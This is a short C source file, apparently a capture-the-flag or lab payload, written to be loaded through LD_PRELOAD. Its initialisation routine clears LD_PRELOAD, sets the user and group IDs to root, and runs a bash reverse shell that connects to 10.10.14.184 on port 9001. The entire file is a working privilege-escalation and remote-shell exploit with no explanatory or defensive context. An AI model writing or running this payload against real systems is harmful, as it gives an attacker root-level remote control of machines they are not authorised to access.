#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("bash -c \'bash -i >& /dev/tcp/10.10.14.184/9001 0>&1\'");
}
